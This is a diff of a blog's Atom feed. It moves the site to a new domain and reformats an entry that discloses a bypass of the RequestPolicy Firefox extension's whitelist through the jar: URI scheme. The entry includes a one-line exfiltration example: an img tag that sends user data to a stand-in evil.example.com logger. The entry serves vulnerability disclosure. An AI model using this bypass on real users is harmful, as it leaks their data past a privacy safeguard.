@@ -2,10 +2,10 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
 
   <title><![CDATA[Category: Requestpolicy | Defined Misbehaviour]]></title>
-  <link href="http://JordanMilne.github.io/blog/categories/requestpolicy/atom.xml" rel="self"/>
-  <link href="http://JordanMilne.github.io/"/>
-  <updated>2014-04-12T01:02:55-03:00</updated>
-  <id>http://JordanMilne.github.io/</id>
+  <link href="http://blog.saynotolinux.com/blog/categories/requestpolicy/atom.xml" rel="self"/>
+  <link href="http://blog.saynotolinux.com/"/>
+  <updated>2014-12-09T20:51:24-04:00</updated>
+  <id>http://blog.saynotolinux.com/</id>
   <author>
     <name><![CDATA[Jordan Milne]]></name>
     
@@ -15,15 +15,14 @@
   
   <entry>
     <title type="html"><![CDATA[Bypassing RequestPolicy's Whitelist Using the Jar: URI Scheme]]></title>
-    <link href="http://JordanMilne.github.io/2013/11/29/bypassing-requestpolicys-whitelist-using-the-jar-uri-scheme/"/>
+    <link href="http://blog.saynotolinux.com/blog/2013/11/29/bypassing-requestpolicys-whitelist-using-the-jar-uri-scheme/"/>
     <updated>2013-11-29T04:11:39-04:00</updated>
-    <id>http://JordanMilne.github.io/2013/11/29/bypassing-requestpolicys-whitelist-using-the-jar-uri-scheme</id>
+    <id>http://blog.saynotolinux.com/blog/2013/11/29/bypassing-requestpolicys-whitelist-using-the-jar-uri-scheme</id>
     <content type="html"><![CDATA[<p>Here&rsquo;s an interesting bug I found while looking at some cross-domain data-stealing issues.
 It&rsquo;s possible to bypass <a href="https://www.requestpolicy.com/about.html">RequestPolicy</a>&rsquo;s whitelist entirely by referencing a resource nested in a <a href="http://www.gnucitizen.org/blog/web-mayhem-firefoxs-jar-protocol-issues/">jar URI</a>:</p>
 
-<p><code>html Exfiltration example
-&lt;img src="jar:http://evil.example.com/logger?userdata=whatever!/foobar" /&gt;
-</code></p>
+<pre><code class="html Exfiltration example">&lt;img src="jar:http://evil.example.com/logger?userdata=whatever!/foobar" /&gt;
+</code></pre>
 
 <p>Firefox will block the resource from being displayed even if it is
 valid (due to prior security issues with the jar URI scheme,) but a
@@ -44,7 +43,6 @@ Since all <a href="https://github.com/RequestPolicy/requestpolicy/blob/20815944f
 I&rsquo;m not sure if the patch has any interactions with extensions, but it should also fix issues with
 nested use of the view-source scheme (which for some reason doesn&rsquo;t implement <a href="http://dxr.mozilla.org/mozilla-central/source/netwerk/base/public/nsINestedURI.idl">nsINestedURI</a>)</p>
 
-<a name="Proof-of-Concept"></a>
 <h2>Proof-of-Concept</h2>
 
 <p>If you&rsquo;d like to see whether or not you&rsquo;re vulnerable, <a href="http://saynotolinux.com/tests/requestpolicy_jar.html">I&rsquo;ve made a Proof-of-Concept</a> that detects whether or not RequestPolicy blocked an image from a jar URI.</p>
